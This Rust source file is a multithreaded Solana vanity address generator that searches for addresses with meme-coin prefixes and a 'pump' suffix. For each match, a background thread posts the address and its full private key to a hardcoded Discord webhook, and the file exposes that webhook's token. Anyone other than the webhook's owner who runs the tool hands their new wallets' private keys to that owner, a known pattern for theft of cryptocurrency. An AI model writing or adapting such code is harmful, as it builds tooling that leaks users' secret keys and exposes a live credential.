use chrono::Utc;
use parking_lot::Mutex;
use rayon::prelude::*;
use serde::Serialize;
use solana_sdk::signature::Keypair;
use solana_sdk::signer::Signer;
use std::fs::OpenOptions;
use std::io::{stdout, Write};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use crossbeam::queue::SegQueue;

const DISCORD_WEBHOOK: &str = "https://discord.com/api/webhooks/1447635716577169483/oRtAG1YjD3wwVKgVeOJ-F22-syubzOON4KE4inRDNpcFn7PkYzBVsPK-wzGaf-4pIPm1";
const RESULTS_FILE: &str = "vanity_wallets.txt";

// All prefixes to search for (case-insensitive)
const PREFIXES: &[&str] = &["wif", "mlg", "pop", "aura"];

#[derive(Clone)]
struct WalletMatch {
    address: String,
    private_key: String,
}

#[derive(Serialize)]
struct EmbedField {
    name: String,
    value: String,
    inline: bool,
}

#[derive(Serialize)]
struct Embed {
    fields: Vec<EmbedField>,
    timestamp: String,
}

#[derive(Serialize)]
struct DiscordPayload {
    embeds: Vec<Embed>,
}

fn background_worker(queue: Arc<SegQueue<WalletMatch>>, bench_mode: bool) {
    let client = reqwest::blocking::Client::new();
    loop {
        // Process all queued matches, then sleep briefly
        while let Some(m) = queue.pop() {
            if !bench_mode {
                // Write to file
                let output = format!("{}\n\n{}\n\n\n", m.address, m.private_key);
                if let Ok(mut file) = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(RESULTS_FILE)
                {
                    let _ = file.write_all(output.as_bytes());
                }

                // Send to Discord
                let payload = DiscordPayload {
                    embeds: vec![Embed {
                        fields: vec![
                            EmbedField {
                                name: "Public Key".to_string(),
                                value: format!("`{}`", m.address),
                                inline: false,
                            },
                            EmbedField {
                                name: "Private Key".to_string(),
                                value: format!("`{}`", m.private_key),
                                inline: false,
                            },
                        ],
                        timestamp: Utc::now().to_rfc3339(),
                    }],
                };
                match client
                    .post(DISCORD_WEBHOOK)
                    .json(&payload)
                    .send()
                {
                    Ok(response) => {
                        if response.status().is_success() {
                            println!("Sent to Discord successfully!");
                        } else {
                            println!("Discord webhook failed: {}", response.status());
                        }
                    }
                    Err(e) => {
                        println!("Failed to send to Discord: {}", e);
                    }
                }
            }
        }
        thread::sleep(Duration::from_millis(10));
    }
}

fn format_number(n: u64) -> String {
    let s = n.to_string();
    let mut result = String::new();
    for (i, c) in s.chars().rev().enumerate() {
        if i > 0 && i % 3 == 0 {
            result.insert(0, ',');
        }
        result.insert(0, c);
    }
    result
}

fn main() {
    // Clear console
    print!("\x1B[2J\x1B[1;1H");
    
    let num_threads = num_cpus::get();
    println!("\nUsing {} worker threads\n", num_threads);

    // If `BENCH_MODE` is set (e.g. BENCH_MODE=1), disable console I/O and network
    // so we can measure pure key-generation speed. Optionally set `BENCH_DURATION`
    // (seconds) to run for a fixed time and print a final summary.
    let bench_mode = std::env::var("BENCH_MODE").map(|v| v == "1").unwrap_or(false);
    let bench_duration: u64 = std::env::var("BENCH_DURATION")
        .ok()
        .and_then(|s| s.parse::<u64>().ok())
        .unwrap_or(0);

    let total_attempts = Arc::new(AtomicU64::new(0));
    let wallets_found = Arc::new(AtomicU64::new(0));
    let start_time = Instant::now();
    
    // For thread-safe console output
    let print_lock = Arc::new(Mutex::new(()));

    // Lock-free queue for match results
    let match_queue = Arc::new(SegQueue::new());
    let queue_clone = Arc::clone(&match_queue);
    thread::spawn(move || background_worker(queue_clone, bench_mode));

    // Speed logging thread
    let attempts_clone = Arc::clone(&total_attempts);
    let found_clone = Arc::clone(&wallets_found);
    if !bench_mode {
        thread::spawn(move || {
            loop {
                thread::sleep(Duration::from_millis(100));
                let elapsed = start_time.elapsed().as_secs_f64();
                let attempts = attempts_clone.load(Ordering::Relaxed);
                let speed = if elapsed > 0.0 { (attempts as f64 / elapsed) as u64 } else { 0 };
                let found = found_clone.load(Ordering::Relaxed);
                
                print!(
                    "\rSpeed: {} keys/sec | Total: {} | Found: {}",
                    format_number(speed),
                    format_number(attempts),
                    found
                );
                stdout().flush().unwrap();
            }
        });
    }

    // If we're in bench mode with a duration, spawn a timer thread that will
    // print a final summary and exit after the requested number of seconds.
    if bench_mode && bench_duration > 0 {
        let attempts_clone2 = Arc::clone(&total_attempts);
        let found_clone2 = Arc::clone(&wallets_found);
        thread::spawn(move || {
            thread::sleep(Duration::from_secs(bench_duration));
            let attempts = attempts_clone2.load(Ordering::Relaxed);
            let found = found_clone2.load(Ordering::Relaxed);
            let elapsed = bench_duration as f64;
            let speed = if elapsed > 0.0 { (attempts as f64 / elapsed) as u64 } else { 0 };
            println!("\n\nBENCH COMPLETE: {} attempts in {:.2}s => {} keys/sec | Found: {}", attempts, elapsed, speed, found);
            std::process::exit(0);
        });
    }

    // Main generation loop using rayon for parallelism
    loop {
        (0..100000).into_par_iter().for_each(|_| {
            let keypair = Keypair::new();
            let pubkey_bytes = keypair.pubkey().to_bytes();
            
            // Quick check: decode base58 in our head by checking the raw bytes
            // Actually, just convert once and check
            let address = bs58::encode(&pubkey_bytes).into_string();
            let address_lower = address.to_ascii_lowercase();

            total_attempts.fetch_add(1, Ordering::Relaxed);

            // Early exit if doesn't start with target prefix
            let starts_with_target = PREFIXES.iter().any(|p| address_lower.starts_with(p));
            if !starts_with_target {
                return;
            }
            
            let ends_with_pump = address_lower.ends_with("pump");
            let is_match = ends_with_pump;

            if is_match {
                let private_key = bs58::encode(keypair.to_bytes()).into_string();
                wallets_found.fetch_add(1, Ordering::Relaxed);
                
                let elapsed = start_time.elapsed().as_secs_f64();
                let attempts = total_attempts.load(Ordering::Relaxed);
                let speed = if elapsed > 0.0 { (attempts as f64 / elapsed) as u64 } else { 0 };
                if bench_mode {
                    // In bench mode, don't do prints, file IO or webhook sends.
                } else {
                    // Lock for clean console output
                    let _lock = print_lock.lock();
                    
                    println!("\n\nAddress:     {}", address);
                    println!("Private Key: {}", private_key);
                    println!(
                        "Time: {:.2}s | Attempts: {} | Speed: {} keys/sec\n",
                        elapsed,
                        format_number(attempts),
                        format_number(speed)
                    );

                    // Push to queue (lock-free, no blocking)
                    match_queue.push(WalletMatch {
                        address: address.clone(),
                        private_key: private_key.clone(),
                    });
                }
            }
        });
    }
}